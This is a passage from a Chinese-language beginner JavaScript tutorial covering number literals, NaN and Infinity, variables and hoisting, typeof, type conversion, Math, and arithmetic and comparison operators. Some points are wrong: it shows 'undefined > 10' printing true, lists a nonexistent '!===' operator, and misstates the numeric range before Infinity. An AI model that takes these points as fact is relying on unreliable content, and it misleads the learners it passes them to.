<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">.1</span>+<span class="number">.2</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">.5</span>+<span class="number">.3</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">.6</span>+<span class="number">.2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="number">0.30000000000000004</span></span><br><span class="line"><span class="number">0.8</span></span><br><span class="line"><span class="number">0.8</span></span><br></pre></td></tr></table></figure>

<p>小数在进行计算的时候：0.1 + 0.2 这个比较特殊。</p>
<p>由于 0.1 和 0.2 在进行计算的时候，由于遵守 IEEE754 浮点数算数标准，计算机底层转换为二进制数据进行计算。没办法整除（后面保留17位小数）。</p>
<h5 id="科学计数法"><a href="#科学计数法" class="headerlink" title="科学计数法"></a>科学计数法</h5><p>概述：科学计数法，也是表示数字一种形式。代表的是某一个数字与 10 的 N 次幂的乘积。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">10e-1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">10e1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">10e+1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">100</span></span><br><span class="line"><span class="number">100</span></span><br></pre></td></tr></table></figure>

<p>科学计数法中的英文单词 e 可以是大小写不敏感的</p>
<h5 id="特殊值"><a href="#特殊值" class="headerlink" title="特殊值"></a>特殊值</h5><h6 id="Infinity"><a href="#Infinity" class="headerlink" title="Infinity"></a>Infinity</h6><p>Infinity 即无穷的意思</p>
<p>概述：在 JS 当中，数字其实是有范围的。-2^53~2^53，如果开发中书写数字超出这个范围，可以利用特殊值 Infinity 进行表示。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Infinity</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(-<span class="title class_">Infinity</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">666e666</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="title class_">Infinity</span></span><br><span class="line">-<span class="title class_">Infinity</span></span><br><span class="line"><span class="title class_">Infinity</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>数字类型的特殊值 Infinity，也有正负之分。代表这个数字超出 JS 数字范围</p>
</li>
<li><p>Infinity 的首个英文字母，是大写的。</p>
</li>
</ul>
<h6 id="NaN"><a href="#NaN" class="headerlink" title="NaN"></a>NaN</h6><p>概述：NaN，英文全称 Not A Number，它是 Number（数字类型）中的一个特殊值。这个数值，一般是在数学计算不出结果的时候会出现的。</p>
<p>比如：在数学当中，数字零不能作为分母的。如果出现这种现象，别的语言可能崩掉。但是在 JS 当中，不会出现崩掉现象，而是给你返回一个数字类型特殊值 NaN</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">0</span>/<span class="number">0</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>/<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="title class_">NaN</span></span><br><span class="line"><span class="title class_">Infinity</span> </span><br></pre></td></tr></table></figure>

<p>如果分子、分母同时为零。计算不出结果，只能返回一个数字类型特殊值 NaN</p>
<p>如果分子不为零，分母为零或趋近于零的这样的一个数字，会返回一个数字类型特殊值 Infinity。</p>
<h4 id="字符串类型的字面量"><a href="#字符串类型的字面量" class="headerlink" title="字符串类型的字面量"></a>字符串类型的字面量</h4><p>概述：字符串（string）类型数据外层需要加上双引号、单引号。</p>
<p>字符串：是由字符组成的，而字符串中的字符，可以是汉字、英文字母、数字、任意特殊字符。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Infinity &quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(-<span class="title class_">Infinity</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;666&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; 6 6 6 &quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="title class_">Infinity</span> <span class="comment">// 黑色</span></span><br><span class="line">-<span class="title class_">Infinity</span> <span class="comment">// 蓝色</span></span><br><span class="line"></span><br><span class="line"><span class="number">666</span></span><br><span class="line"> <span class="number">6</span> <span class="number">6</span> <span class="number">6</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>字符串</strong>在控制台上打印的时候是<strong>黑色</strong>的</li>
<li>数据外层如果加上双引号、单引号。即为字符串类的数据</li>
<li>空格也可以作为字符串的字符</li>
<li>如果字符串中一个字符也没有，称之为空字符</li>
</ul>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>variable 即变量、可变情况</p>
<p>变量可以理解为一个容器，容器中可以存放任意类型的字面量数值、或者装载数学计算完的结果</p>
<p>可以通过访问变量名字、获取到变量存储的结果</p>
<p>变量在使用的时候分为三步：声明、赋值和使用</p>
<ol>
<li>声明：我们在使用变量之前，要通过关键字 var 进行声明一次</li>
<li>赋值：可以将任意类型的字面量数值、数字计算完结果，赋值给变量</li>
<li>使用：通过访问变量名字，获取到变量存储结果</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> a;</span></span><br><span class="line"><span class="language-javascript">    a = <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>声明一个变量但是不赋值，默认初始值为为定义类型值 undefined </p>
<p>一个变量在声明一次后，可以进行多次赋值。后者赋值的数据会层叠前者赋值的数据</p>
<p>直接访问一个未声明的变量，会直接报错</p>
<h3 id="其他声明方式"><a href="#其他声明方式" class="headerlink" title="其他声明方式"></a>其他声明方式</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> a = <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> b,c;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(c);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以将第一步声明和第二步赋值合并在一起</p>
<p>一个关键字 var 可以同时声明多个变量，多个变量之间用逗号隔开</p>
<h3 id="命名标识符规范"><a href="#命名标识符规范" class="headerlink" title="命名标识符规范"></a>命名标识符规范</h3><p>概述：对变量、函数起名字的时候，必须要遵守以下规则</p>
<ol>
<li>可以是数字、英文字母、下划线、美元符号 $</li>
<li>不能以数字开头</li>
<li>不能是关键字、保留字</li>
</ol>
<h3 id="提升"><a href="#提升" class="headerlink" title="提升"></a>提升</h3><p>概述：各大浏览器的厂商都有属于自己的解析器。在翻译代码的时候，会将变量的声明部分，提升到当前作用域的最上方。</p>
<p>解析器：各大浏览器厂商都有属于自己的解析器。就是将代码翻译给浏览器，让浏览器知道写的是什么</p>
<p>作用域：书写代码的范围</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(sex); <span class="comment">// undefined</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> sex ;</span></span><br><span class="line"><span class="language-javascript">	sex = <span class="string">&quot;女&quot;</span></span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(sex); <span class="comment">// 女</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 相当于 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> sex ;</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(sex); <span class="comment">// undefined</span></span></span><br><span class="line"><span class="language-javascript">	sex = <span class="string">&quot;女&quot;</span></span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(sex); <span class="comment">// 女</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>即第一个控制台输出的 undefined 是因为解释器将 var 定义的 sex 提到顶部了，但是不会赋值部分不会提升，所以第一次在控制台输出的是默认初始值 undefined</p>
</li>
<li><p>第二次访问变量时，已经给 sex 赋值了，所以得出结果为女</p>
</li>
</ul>
<h2 id="数据类型的判断"><a href="#数据类型的判断" class="headerlink" title="数据类型的判断"></a>数据类型的判断</h2><p>概述：在 JS 中，可以利用关键字 typeof，它主要的作用时可以检测任意类型的字面量或者变量存储的数据为什么类型的数值。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> <span class="string">&quot;JavaScript&quot;</span>); </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> <span class="number">123</span>); </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> <span class="number">1.2</span>);  </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> <span class="title class_">Infinity</span>); </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> infinity); </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> <span class="title class_">NaN</span>); </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> <span class="literal">undefined</span>); </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> <span class="literal">null</span>); </span><br><span class="line"><span class="keyword">var</span> age = <span class="number">123</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> age); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">string</span><br><span class="line">number</span><br><span class="line">number</span><br><span class="line">number</span><br><span class="line"><span class="literal">undefined</span> (注意大小写)</span><br><span class="line">number</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">object</span><br><span class="line">number</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Null 类型是第二个只有一个值的数据类型（第一个是 undefined，该类型的值只有一个 undefined，该值用于表示某个变量不存在，或者没有为其分配值，也用于表示对象的属性不存在），这个特殊的值是 null，从逻辑角度来看，null 值表示一个空对象指针，而这也正是使typeof 操作符检测 null 值会返回 object 的原因，其实这是 JavaScript 最初实现的一个错误，后来被 ECMAScript 沿用下来 </p>
</li>
<li><p>typeof 关键字可以检测数据的类型</p>
</li>
<li><p>使用的时候，关键字 <code>typeof + 空格 + 检测数据</code> 即可</p>
</li>
</ul>
<p>注：typeof 后面接多个量（含自己定义的变量）时只会返回第一个数据类型并连接后面的变量的值作为字符串输出</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> age = <span class="number">1</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> <span class="number">1</span>+age); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">number1</span><br></pre></td></tr></table></figure>

<h2 id="数据类型的转换"><a href="#数据类型的转换" class="headerlink" title="数据类型的转换"></a>数据类型的转换</h2><h3 id="数字转换为字符串"><a href="#数字转换为字符串" class="headerlink" title="数字转换为字符串"></a>数字转换为字符串</h3><p>在 JS 当中，可以通过连字符 + 将数字类型的数据转换为字符串</p>
<ul>
<li><p>如果语句当中没有出现字符串，这个加号就是数学的加法，可以进行数学的加法运算</p>
</li>
<li><p>如果语句中出现了字符串，这个加号就不是数学的加法了，会将数据从左到右变成字符串</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> age = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">var</span> test1 = <span class="string">&quot;我今年&quot;</span>+age+<span class="string">&quot;了&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> test2 = age + <span class="number">666</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> test1);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> test2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">string</span><br><span class="line">number</span><br></pre></td></tr></table></figure>

<h3 id="字符串转换为数字"><a href="#字符串转换为数字" class="headerlink" title="字符串转换为数字"></a>字符串转换为数字</h3><p>概述：在 JS 当中，我们可以通过 parseInt，和 parseFloat 将字符串转换为数字</p>
<ul>
<li><p>内置函数 parseInt，可以将字符串中的数字形式字符串转换为数字（只能得到整数）</p>
</li>
<li><p>内置函数 parseFloat，可以将字符串中的数字形式的字符串转换为数字（可以精确到小数部分）</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">parseInt</span>(<span class="string">&quot;567先生有8910只鹅&quot;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">parseFloat</span>(<span class="string">&quot;3.14和3.13谁大&quot;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">parseFloat</span>(<span class="string">&quot;兄弟，兄弟...&quot;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">parseInt</span>(<span class="string">&quot;兄弟，兄弟...&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="number">567</span></span><br><span class="line"><span class="number">3.14</span></span><br><span class="line"><span class="title class_">NaN</span></span><br><span class="line"><span class="title class_">NaN</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>二者都使用的是驼峰命名，即 I 和 F 必须大写，否则会报错</p>
</li>
<li><p>在进行转换时，从左到右转换，如果数字形式字符，转换为数字，遇见了非数字形式的字符，后面的数据就不进行转换了</p>
</li>
<li><p>parseInt 和 parseFloat 的使用方法都是一模一样的，只是精确度不同</p>
</li>
</ul>
<h2 id="提示框"><a href="#提示框" class="headerlink" title="提示框"></a>提示框</h2><p>提示框 prompt 可以在浏览器上方弹出一个提示框。用户是可以输入数据的。我们可以获取用户输入进来的数据，利用这些用户输入进来的数据，进行编程</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> x = <span class="title function_">prompt</span>(<span class="string">&quot;有几只鸭子在水面上&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;水面上有&quot;</span> + x +<span class="string">&quot;只鸭子&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>用户在提示框中输入进来的数据，可以用变量进行存储</p>
</li>
<li><p>用户输入进来的数据都是字符串类型的数据</p>
</li>
</ul>
<h2 id="数学对象"><a href="#数学对象" class="headerlink" title="数学对象"></a>数学对象</h2><p>在 JS 中，给我们提供了一个内置的数学对象 Math，这个对象拥有很多的属性和方法</p>
<p>对象：在 JS 中，我们经常讲引用类型的数据称为对象</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> <span class="title class_">Math</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="property">log</span> (<span class="title class_">Math</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出：</span></span><br><span class="line">object <span class="comment">// 属性</span></span><br><span class="line"><span class="attr">E</span>: <span class="number">2.718281828459045</span> <span class="comment">// 带 f 的方法</span></span><br><span class="line"><span class="title class_">LN2</span>: <span class="number">0.6931471805599453</span></span><br><span class="line"><span class="title class_">LN10</span>: <span class="number">2.302585092994046</span></span><br><span class="line"><span class="title class_">LOG2E</span>: <span class="number">1.4426950408889634</span></span><br><span class="line"><span class="title class_">LOG10E</span>: <span class="number">0.4342944819032518</span></span><br><span class="line"><span class="attr">PI</span>: <span class="number">3.141592653589793</span></span><br><span class="line"><span class="title class_">SQRT1</span><span class="attr">_2</span>: <span class="number">0.7071067811865476</span></span><br><span class="line"><span class="title class_">SQRT2</span>: <span class="number">1.4142135623730951</span></span><br><span class="line"><span class="attr">abs</span>: ƒ <span class="title function_">abs</span>()</span><br><span class="line"><span class="attr">acos</span>: ƒ <span class="title function_">acos</span>()</span><br><span class="line"><span class="attr">acosh</span>: ƒ <span class="title function_">acosh</span>()</span><br><span class="line"><span class="attr">asin</span>: ƒ <span class="title function_">asin</span>()</span><br><span class="line"><span class="attr">asinh</span>: ƒ <span class="title function_">asinh</span>()</span><br><span class="line"><span class="attr">atan</span>: ƒ <span class="title function_">atan</span>()</span><br><span class="line"><span class="attr">atan2</span>: ƒ <span class="title function_">atan2</span>()</span><br><span class="line"><span class="attr">atanh</span>: ƒ <span class="title function_">atanh</span>()</span><br><span class="line"><span class="attr">cbrt</span>: ƒ <span class="title function_">cbrt</span>()</span><br><span class="line"><span class="attr">ceil</span>: ƒ <span class="title function_">ceil</span>()</span><br><span class="line"><span class="attr">clz32</span>: ƒ <span class="title function_">clz32</span>()</span><br><span class="line"><span class="attr">cos</span>: ƒ <span class="title function_">cos</span>()</span><br><span class="line"><span class="attr">cosh</span>: ƒ <span class="title function_">cosh</span>()</span><br><span class="line"><span class="attr">exp</span>: ƒ <span class="title function_">exp</span>()</span><br><span class="line"><span class="attr">expm1</span>: ƒ <span class="title function_">expm1</span>()</span><br><span class="line"><span class="attr">floor</span>: ƒ <span class="title function_">floor</span>()</span><br><span class="line"><span class="attr">fround</span>: ƒ <span class="title function_">fround</span>()</span><br><span class="line"><span class="attr">hypot</span>: ƒ <span class="title function_">hypot</span>()</span><br><span class="line"><span class="attr">imul</span>: ƒ <span class="title function_">imul</span>()</span><br><span class="line"><span class="attr">log</span>: ƒ <span class="title function_">log</span>()</span><br><span class="line"><span class="attr">log1p</span>: ƒ <span class="title function_">log1p</span>()</span><br><span class="line"><span class="attr">log2</span>: ƒ <span class="title function_">log2</span>()</span><br><span class="line"><span class="attr">log10</span>: ƒ <span class="title function_">log10</span>()</span><br><span class="line"><span class="attr">max</span>: ƒ <span class="title function_">max</span>()</span><br><span class="line"><span class="attr">min</span>: ƒ <span class="title function_">min</span>()</span><br><span class="line"><span class="attr">pow</span>: ƒ <span class="title function_">pow</span>()</span><br><span class="line"><span class="attr">random</span>: ƒ <span class="title function_">random</span>()</span><br><span class="line"><span class="attr">round</span>: ƒ <span class="title function_">round</span>()</span><br><span class="line"><span class="attr">sign</span>: ƒ <span class="title function_">sign</span>()</span><br><span class="line"><span class="attr">sin</span>: ƒ <span class="title function_">sin</span>()</span><br><span class="line"><span class="attr">sinh</span>: ƒ <span class="title function_">sinh</span>()</span><br><span class="line"><span class="attr">sqrt</span>: ƒ <span class="title function_">sqrt</span>()</span><br><span class="line"><span class="attr">tan</span>: ƒ <span class="title function_">tan</span>()</span><br><span class="line"><span class="attr">tanh</span>: ƒ <span class="title function_">tanh</span>()</span><br><span class="line"><span class="attr">trunc</span>: ƒ <span class="title function_">trunc</span>()</span><br><span class="line"><span class="title class_">Symbol</span>(<span class="title class_">Symbol</span>.<span class="property">toStringTag</span>): <span class="string">&quot;Math&quot;</span></span><br><span class="line">[[<span class="title class_">Prototype</span>]]: <span class="title class_">Object</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>Math 数学对象，提供了很多数学方法</p>
</li>
<li><p>Math 对象的属性后面不需要加上小括号</p>
</li>
<li><p>Math 对象的方法后面要加上小括号</p>
</li>
<li><p>Math 数学对象的方法中，如果传递多个参数，需要用逗号隔开</p>
</li>
</ul>
<h2 id="数学运算符"><a href="#数学运算符" class="headerlink" title="数学运算符"></a>数学运算符</h2><p>在 JS 语言中，也有数学运算符；其实数学运算都就是加、减、乘、除，取余数</p>
<p>注意的是加号在有字符串参与的时候是作为连字符使用的</p>
<p>在 JS 中，除了 Number 之外的数据类型也可以参与数学运算，只不过浏览器中的解析器会自动的将其他类型的数据“隐式转换”为数字参见数学运算</p>
<h3 id="Number-类型数值参与"><a href="#Number-类型数值参与" class="headerlink" title="Number 类型数值参与"></a>Number 类型数值参与</h3><p>Infinity 参与运算的加减乘除结果都是 Infinity，取余得到的是 NaN，算不出来</p>
<p>NaN 参与数学运算，其结果都是 NaN</p>
<h3 id="其他类型数据参与（不包含字符串类型）"><a href="#其他类型数据参与（不包含字符串类型）" class="headerlink" title="其他类型数据参与（不包含字符串类型）"></a>其他类型数据参与（不包含字符串类型）</h3><p>概述：在 JS 当中，不仅仅 Number 类型的数值可以参与数学运算。其他类型的数据也可以参与数学运算。只不过，浏览器翻译器，自动的将这些数据“隐式转换”为数字参与数学运算。其他数据类型：布尔类型、未定义类型、空对象类型。</p>
<p>注：其实浏览器中的解析器，底层是通过内置的函数 Number，将其他类型的数据临时转换为数字的</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">隐式转换为数字</th>
</tr>
</thead>
<tbody><tr>
<td align="center">true</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">false</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">undefined</td>
<td align="center">NaN</td>
</tr>
<tr>
<td align="center">null</td>
<td align="center">0</td>
</tr>
</tbody></table>
<h3 id="string类型参与"><a href="#string类型参与" class="headerlink" title="string类型参与"></a>string类型参与</h3><p>特别注意：加号，比较特殊。如果语句当中，出现字符串，加号所谓连字符。</p>
<ul>
<li><p>字符串和加号一起使用（连字符）。将数据从左到右依次拼接，转换为字符串。</p>
</li>
<li><p>字符串和减、乘、除、取余数进行数学运算的时候。字符串需要“隐式转换”为数字参与。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">string 类型</th>
<th align="center">隐式转换为数字</th>
</tr>
</thead>
<tbody><tr>
<td align="center">空字符串</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">纯数字字符的字符串</td>
<td align="center">转为对应的数字</td>
</tr>
<tr>
<td align="center">非纯数字字符的字符串</td>
<td align="center">NaN</td>
</tr>
</tbody></table>
<h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>概述：在 JS 语言当中也有所谓比较运算符（比较操作符）。比如：大于、小于、大于等于、小于等于等等。</p>
<p>比较运算符作用：进行数据对比，如果对比结果是真的，返回布尔值 true，如果对比的结果为假的，返回布尔值 false。</p>
<p>特别注意：在生活、学习当中，经常出现数字和数字进行比较大小。但是需要注意的是，在 JS 这门语言当中，不仅仅数字类型的数据可以参与比较运算符。其他类型的数据（字符串、布尔值、未定义、空对象）也可以参与比较运算。只不过浏览器中的解析器，将其他类型的数据自动的‘隐式转换’为数字进行比较。</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&gt;</td>
<td align="center">大于</td>
</tr>
<tr>
<td align="center">&gt;&#x3D;</td>
<td align="center">大于等于</td>
</tr>
<tr>
<td align="center">&lt;</td>
<td align="center">小于</td>
</tr>
<tr>
<td align="center">&lt;&#x3D;</td>
<td align="center">小于等于</td>
</tr>
<tr>
<td align="center">&#x3D;&#x3D;</td>
<td align="center">相等</td>
</tr>
<tr>
<td align="center">&#x3D;&#x3D;&#x3D;</td>
<td align="center">全等（值和数据类型都等）</td>
</tr>
<tr>
<td align="center">!&#x3D;</td>
<td align="center">不等</td>
</tr>
<tr>
<td align="center">!&#x3D;&#x3D;&#x3D;</td>
<td align="center">不全等</td>
</tr>
</tbody></table>
<ul>
<li><p>一个等号称之为赋值运算符（经常给变量进行赋值）。不是用来比较大小的，不是比较运算符。</p>
</li>
<li><p>两个等号（比较运算符：相等的判断），判断依据是数值是否相等。</p>
</li>
<li><p>三个等号（比较运算符：全等的判断），判断的依据是数值和数据类型是否全等。</p>
</li>
</ul>
<h3 id="Number类型的数值参与"><a href="#Number类型的数值参与" class="headerlink" title="Number类型的数值参与"></a>Number类型的数值参与</h3><p>正常的 Number 类型间的加减乘除以及取余计算都是正常的按法计算即可，返回的结果是 true 和 false</p>
<p>相等和全等：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">666</span> == <span class="string">&quot;666&quot;</span>); <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">666</span> === <span class="string">&quot;666&quot;</span>); <span class="comment">// false</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Number类型的特殊值参与"><a href="#Number类型的特殊值参与" class="headerlink" title="Number类型的特殊值参与"></a>Number类型的特殊值参与</h3><ul>
<li><p>Infinity 参与比较运算时，按正常计算即可，Infinity 全等于其本身</p>
</li>
<li><p>NaN，在 JS 当中，全部特殊值（数字类型：Infinity、NaN；未定义：undefined；空对象：null）当中，只有数字类型的特殊值 NaN 和自身比较的时候不等。其余的特殊值和自身比较的时候都是相等的。</p>
</li>
<li><p>数字类型的特殊值 NaN 参与比较运算：只有带！(不)，返回的是布尔值 true，其余都是 false。</p>
</li>
</ul>
<h3 id="其他类型数据参与（不包含字符串类型）-1"><a href="#其他类型数据参与（不包含字符串类型）-1" class="headerlink" title="其他类型数据参与（不包含字符串类型）"></a>其他类型数据参与（不包含字符串类型）</h3><p>概述：在 JS 当中，其他类型数据（布尔、未定义、空对象）也可以参与比较运算。</p>
<p>需要注意的是，其他类型的数据参与比较运算的时候，需要‘隐式转换’为数字参与比较运算。</p>
<p>下面是其他类型数据隐式转换为数字</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">true</span> === <span class="number">1</span>); </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">false</span> == <span class="number">0</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span> &gt; <span class="number">10</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">undefined</span> &gt; <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="字符串类型参与"><a href="#字符串类型参与" class="headerlink" title="字符串类型参与"></a>字符串类型参与</h3><p>概述：字符串类型数据也可以参与比较运算。</p>
<ol>
<li><p>其他类型数据（数字、布尔、未定义、空对象）和字符串进行对比。通过隐式转换为数字进行对比，隐式转换的值和上面数学计算的值相同。</p>
</li>
<li><p>字符串和字符串进行对比。通过 ASCII 进行对比。</p>
</li>
</ol>
<p>注：字符串和字符串进行对比的时候是通过 ASCII 进行对比。如果是字符串和字符串进行对比。是通过<strong>从左到右</strong>一个一个字符进行比较，直到比较除结果为止。</p>
<p>0~9&lt;A-Z&lt;a-z：这些字符从左到右依次变大。</p>
<p>汉字太多了，但是每一个汉字都有对应的 ASCII 数值。</p>
<p>字符串与字符串对比：</p>
